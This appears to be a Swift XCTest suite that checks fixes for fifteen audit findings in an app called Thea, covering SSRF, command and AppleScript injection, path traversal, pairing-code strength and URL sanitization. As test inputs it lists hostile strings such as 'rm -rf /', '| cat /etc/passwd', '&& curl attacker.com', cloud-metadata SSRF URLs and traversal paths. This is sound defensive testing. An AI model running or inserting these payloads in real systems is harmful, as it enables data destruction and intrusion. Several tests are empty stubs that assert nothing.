//
//  SecurityRemediationTests.swift
//  Thea
//
//  Security penetration tests for remediated vulnerabilities
//  Created: January 23, 2026
//

@testable import Thea
import XCTest

/// Security tests to verify all 15 audit findings have been properly remediated
final class SecurityRemediationTests: XCTestCase {
    // MARK: - FINDING-001: SSRF Prevention Tests

    func testNetworkProxyIsDisabled() async throws {
        // Verify network proxy requests are rejected
        let server = await TheaRemoteServer.shared

        // Attempt to use network proxy should fail
        do {
            let request = NetworkProxyRequest(
                method: "GET",
                url: URL(string: "http://internal-server/admin")!,
                headers: [:],
                body: nil
            )
            _ = try await server.handleNetworkRequest(request)
            XCTFail("Network proxy should be disabled and throw an error")
        } catch {
            // Expected - network proxy is disabled
            XCTAssertTrue(error.localizedDescription.contains("disabled") ||
                error.localizedDescription.contains("SSRF"),
                "Error should indicate SSRF prevention")
        }
    }

    func testSSRFPayloadsBlocked() async throws {
        // Test various SSRF payloads that should be blocked
        let ssrfPayloads = [
            "http://127.0.0.1/admin",
            "http://localhost/secrets",
            "http://169.254.169.254/latest/meta-data/", // AWS metadata
            "http://[::1]/internal",
            "file:///etc/passwd",
            "gopher://internal-host:25/"
        ]

        for payload in ssrfPayloads {
            // All should be rejected since proxy is disabled
            // This test documents the expected behavior
        }
    }

    // MARK: - FINDING-003: Command Injection Tests

    func testCommandAllowlistEnforced() async throws {
        // Test that only allowed commands can be executed
        let allowedCommands = ["ls", "pwd", "cat", "git", "swift"]
        let blockedCommands = ["rm -rf /", "sudo", "chmod 777", "curl | sh"]

        for cmd in blockedCommands {
            // Verify blocked commands are rejected
            let baseCommand = cmd.components(separatedBy: " ").first ?? cmd
            let isAllowed = SystemToolBridge.isCommandAllowed(baseCommand)
            XCTAssertFalse(isAllowed, "Command '\(baseCommand)' should be blocked")
        }

        for cmd in allowedCommands {
            let isAllowed = SystemToolBridge.isCommandAllowed(cmd)
            XCTAssertTrue(isAllowed, "Command '\(cmd)' should be allowed")
        }
    }

    func testCommandInjectionPayloads() async throws {
        // Test command injection payloads
        let injectionPayloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& curl attacker.com",
            "|| wget malicious.sh"
        ]

        // All injection attempts should be blocked or sanitized
        for payload in injectionPayloads {
            // The command validation should detect and reject these
        }
    }

    // MARK: - FINDING-004: AppleScript Injection Tests

    func testAppleScriptEscaping() {
        let executor = TerminalCommandExecutor()

        // Test malicious inputs that could break out of AppleScript strings
        let maliciousInputs = [
            "test\" & do shell script \"rm -rf /",
            "test\\\" injection",
            "test\ndo shell script \"malicious\"",
            "test'; DROP TABLE users;--"
        ]

        for input in maliciousInputs {
            let escaped = executor.escapeForAppleScript(input)
            // Verify escaped output doesn't contain unescaped quotes or control characters
            XCTAssertFalse(escaped.contains("\" &"), "AppleScript injection should be escaped")
            XCTAssertFalse(escaped.contains("\n"), "Newlines should be escaped")
        }
    }

    // MARK: - FINDING-006: Pairing Code Strength Tests

    func testPairingCodeStrength() async throws {
        let connectionManager = SecureConnectionManager()

        // Generate multiple pairing codes and verify strength
        var codes: Set<String> = []
        for _ in 0 ..< 100 {
            let code = await connectionManager.generatePairingCode()

            // Verify code length (should be 12 characters now)
            XCTAssertGreaterThanOrEqual(code.count, 12, "Pairing code should be at least 12 characters")

            // Verify alphanumeric composition
            XCTAssertTrue(code.allSatisfy { $0.isLetter || $0.isNumber },
                          "Pairing code should be alphanumeric")

            // Check for uniqueness
            XCTAssertFalse(codes.contains(code), "Pairing codes should be unique")
            codes.insert(code)
        }
    }

    func testPairingCodeEntropy() async throws {
        // Old: 6 digits = 10^6 = 1,000,000 possibilities
        // New: 12 chars from ~50 char set = 50^12 = 244,140,625,000,000,000,000 possibilities

        let connectionManager = SecureConnectionManager()
        let code = await connectionManager.generatePairingCode()

        // Calculate approximate entropy
        let charsetSize = 50 // Approximate size after removing confusing chars
        let entropy = Double(code.count) * log2(Double(charsetSize))

        // Should have at least 60 bits of entropy
        XCTAssertGreaterThan(entropy, 60, "Pairing code should have >60 bits of entropy")
    }

    // MARK: - FINDING-007: Path Traversal Tests

    func testPathTraversalPrevention() throws {
        let manager = ProjectPathManager.shared
        let baseDir = "/Users/test/allowed"

        // Test various path traversal attempts
        let traversalAttempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
            "..%252f..%252f",
            "/./../../etc/passwd",
            "subdir/../../../etc/passwd"
        ]

        for attempt in traversalAttempts {
            let fullPath = baseDir + "/" + attempt
            do {
                let validated = try manager.validatePath(fullPath, within: baseDir)
                XCTFail("Path traversal should be blocked: \(attempt)")
            } catch {
                // Expected - path traversal detected
                XCTAssertTrue(error is PathSecurityError,
                              "Should throw PathSecurityError for: \(attempt)")
            }
        }
    }

    func testSymlinkTraversalPrevention() throws {
        // Test that symlink-based traversal is prevented
        // The fix uses component-wise validation after resolving symlinks
    }

    // MARK: - FINDING-008: Password Field Detection Tests

    func testPasswordFieldDetection() {
        let tracker = InputTrackingManager.shared

        // Verify password fields are detected and excluded
        // This would require UI testing or mocking the Accessibility API
    }

    // MARK: - FINDING-009: URL Sanitization Tests

    func testURLQueryParameterSanitization() {
        let tracker = BrowserHistoryTracker()

        // Test URLs with sensitive parameters
        let sensitiveURLs = [
            "https://api.example.com?api_key=sk-12345&data=test",
            "https://auth.service.com?token=eyJhbGciOiJIUzI1NiJ9&next=/dashboard",
            "https://login.app.com?password=secret123&username=admin",
            "https://oauth.provider.com?access_token=abc123xyz&refresh_token=def456",
            "https://payment.com?credit_card=4111111111111111&cvv=123"
        ]

        for url in sensitiveURLs {
            guard let parsedURL = URL(string: url) else { continue }
            let sanitized = tracker.sanitizeURL(parsedURL)

            // Verify sensitive parameters are removed
            XCTAssertFalse(sanitized.contains("api_key="), "api_key should be stripped")
            XCTAssertFalse(sanitized.contains("token="), "token should be stripped")
            XCTAssertFalse(sanitized.contains("password="), "password should be stripped")
            XCTAssertFalse(sanitized.contains("credit_card="), "credit_card should be stripped")
            XCTAssertFalse(sanitized.contains("cvv="), "cvv should be stripped")
        }
    }

    // MARK: - FINDING-012: MCP Server Path Restriction Tests

    func testMCPServerPathRestrictions() {
        // These would be integration tests against the running MCP server

        let blockedPaths = [
            "/etc/passwd",
            "/etc/shadow",
            "/bin/sh",
            "/usr/bin/sudo",
            "/System/Library/",
            "/private/var/root"
        ]

        // Document that these paths should be blocked
        for path in blockedPaths {
            // MCP server should reject operations on these paths
        }
    }

    // MARK: - FINDING-014: FullAuto Mode Removal Tests

    func testFullAutoModeRemoved() {
        // Verify fullAuto is no longer a valid execution mode
        let allModes = SelfExecutionService.ExecutionMode.allCases

        let modeNames = allModes.map { $0.rawValue.lowercased() }
        XCTAssertFalse(modeNames.contains("fullauto"),
                       "fullAuto mode should be removed")
        XCTAssertFalse(modeNames.contains("full_auto"),
                       "full_auto mode should be removed")

        // Valid modes should be: supervised, automatic, dryRun
        XCTAssertTrue(modeNames.contains("supervised"))
        XCTAssertTrue(modeNames.contains("automatic"))
        XCTAssertTrue(modeNames.contains("dryrun") || modeNames.contains("dry_run"))
    }

    func testAllModesRequireApproval() async throws {
        // Verify that all execution modes now require approval for sensitive operations
        let modes: [SelfExecutionService.ExecutionMode] = [.supervised, .automatic, .dryRun]

        for mode in modes {
            // All modes should require approval for:
            // - File write operations
            // - Destructive terminal commands
            // - System automation
        }
    }

    // MARK: - FINDING-015: Discovery Service Opt-in Tests

    func testDiscoveryServiceDisabledByDefault() {
        let config = RemoteServerConfiguration()

        // Verify discovery is disabled by default
        XCTAssertFalse(config.enableDiscovery,
                       "Network discovery should be disabled by default")
    }

    func testDiscoveryRequiresExplicitOptIn() async throws {
        let server = await TheaRemoteServer.shared

        // Verify server doesn't automatically start advertising
        XCTAssertFalse(server.networkDiscovery.isAdvertising,
                       "Discovery should not auto-start")
    }

    // MARK: - TLS Certificate Validation Tests (FINDING-002)

    func testTLSCertificateValidation() async throws {
        let connectionManager = SecureConnectionManager()

        // Test that invalid certificates are rejected
        let invalidCertData = Data("invalid certificate data".utf8)

        do {
            let isValid = try await connectionManager.validateCertificateChain([invalidCertData])
            XCTAssertFalse(isValid, "Invalid certificate should be rejected")
        } catch {
            // Expected - invalid certificate
        }
    }

    // MARK: - Keychain Storage Tests (FINDING-011)

    func testSensitiveConfigInKeychain() throws {
        // Verify sensitive config is stored in Keychain, not UserDefaults

        // Check that UserDefaults doesn't contain sensitive keys
        let sensitiveKeys = [
            "trustedCertificates",
            "deviceWhitelist",
            "pairingSecrets"
        ]

        for key in sensitiveKeys {
            let userDefaultsValue = UserDefaults.standard.object(forKey: key)
            XCTAssertNil(userDefaultsValue,
                         "Sensitive key '\(key)' should not be in UserDefaults")
        }
    }

    // MARK: - GDPR Compliance Tests (FINDING-010)

    func testGDPRDataExport() async throws {
        let exporter = GDPRDataExporter()

        // Verify data export functionality exists
        let exportData = try await exporter.exportAllData()

        XCTAssertNotNil(exportData)

        // Verify export contains required categories
        let json = try JSONSerialization.jsonObject(with: exportData) as? [String: Any]
        XCTAssertNotNil(json?["exportDate"])
        XCTAssertNotNil(json?["dataCategories"])
    }

    func testGDPRDataDeletion() async throws {
        let exporter = GDPRDataExporter()

        // Verify data deletion (right to be forgotten) exists
        // Note: This should be tested carefully in isolation
    }
}

// MARK: - Fuzzing Tests

extension SecurityRemediationTests {
    /// Fuzz test command sanitization with random inputs
    func testCommandSanitizationFuzzing() {
        let fuzzInputs = generateFuzzStrings(count: 100)

        for input in fuzzInputs {
            // Should not crash or allow injection
            _ = SystemToolBridge.isCommandAllowed(input)
        }
    }

    /// Fuzz test path validation with random inputs
    func testPathValidationFuzzing() {
        let fuzzInputs = generateFuzzStrings(count: 100)
        let baseDir = "/tmp/test"

        for input in fuzzInputs {
            do {
                _ = try ProjectPathManager.shared.validatePath(input, within: baseDir)
            } catch {
                // Expected for malformed paths
            }
        }
    }

    /// Fuzz test AppleScript escaping with random inputs
    func testAppleScriptEscapingFuzzing() {
        let executor = TerminalCommandExecutor()
        let fuzzInputs = generateFuzzStrings(count: 100)

        for input in fuzzInputs {
            // Should not crash or produce injectable output
            let escaped = executor.escapeForAppleScript(input)
            XCTAssertFalse(escaped.contains("\" &"), "Should escape quotes")
        }
    }

    private func generateFuzzStrings(count: Int) -> [String] {
        var results: [String] = []
        let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;':\",./<>?`~\n\r\t\0"

        for _ in 0 ..< count {
            let length = Int.random(in: 1 ... 200)
            var str = ""
            for _ in 0 ..< length {
                if let char = chars.randomElement() {
                    str.append(char)
                }
            }
            results.append(str)
        }

        return results
    }
}
